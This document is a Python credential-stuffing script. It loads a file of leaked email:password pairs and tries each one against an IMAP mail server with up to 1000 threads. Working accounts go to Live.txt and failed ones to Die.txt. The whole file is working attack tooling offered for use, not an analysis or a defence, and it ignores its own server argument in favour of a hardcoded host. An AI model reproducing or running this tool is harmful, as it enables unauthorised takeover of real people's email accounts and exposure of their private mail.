global TotalCheck
global Die
global Live
import imaplib 
import threading
import os
import sys
import ctypes
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor, as_completed

counter_lock = threading.Lock()
Live = Die = TotalCheck = 0
MAX_THREADS = 1000
init(autoreset=True)

def update_title():
    ctypes.windll.kernel32.SetConsoleTitleW(f'Total: {TotalCheck} | Live: {Live} | Die: {Die}')

def clean_string(s):
    return ''.join((char for char in s if ord(char) < 128))

def process_combo(user, password, server):
    global Live
    global Die  
    global TotalCheck
    try:
        user = clean_string(user)
        password = clean_string(password)
        mail = imaplib.IMAP4_SSL('imap.secureserver.net')
        mail.login(user, password)
        print(f'{Fore.GREEN}LIVE: {user}:{password}{Fore.RESET}')
        with counter_lock:
            with open('Live.txt', 'a+', encoding='utf-8') as live_file:
                live_file.write(f'LIVE: {user}:{password}\n')
            Live += 1
            TotalCheck += 1
            update_title()
    except imaplib.IMAP4.error:
        print(f'{Fore.RED}DIE: {user}:{password}{Fore.RESET}')
        with counter_lock:
            with open('Die.txt', 'a+', encoding='utf-8') as die_file:
                die_file.write(f'DIE: {user}:{password}\n')
            Die += 1 
            TotalCheck += 1
            update_title()
    except Exception as e:
        print(f'{Fore.YELLOW}ERROR: {user}:{password} - {str(e)}{Fore.RESET}')

def main():
    combo_file = input('Combo file path: ').strip()
    threads = int(input('Thread count: '))
    if threads > MAX_THREADS:
        print(f'{Fore.YELLOW}Thread count too high, reducing to {MAX_THREADS}{Fore.RESET}')
        threads = MAX_THREADS
    if not os.path.exists(combo_file):
        sys.exit(f'{Fore.RED}File {combo_file} not found!{Fore.RESET}')
    valid_combos = []
    with open(combo_file, 'r', encoding='utf-8-sig', errors='ignore') as f:
        for line in f:
            line = line.strip()
            try:
                user, pwd = line.split(':', 1)
                valid_combos.append((user, pwd))
            except ValueError:
                print(f'{Fore.YELLOW}Invalid format: {line}{Fore.RESET}')
                continue
    if not valid_combos:
        sys.exit('No valid combos found') 
    update_title()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(process_combo, user, pwd, 'secure.emailsrvr.com') for user, pwd in valid_combos]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f'{Fore.RED}Thread Error: {e}{Fore.RESET}')
                
if __name__ == '__main__':
    main()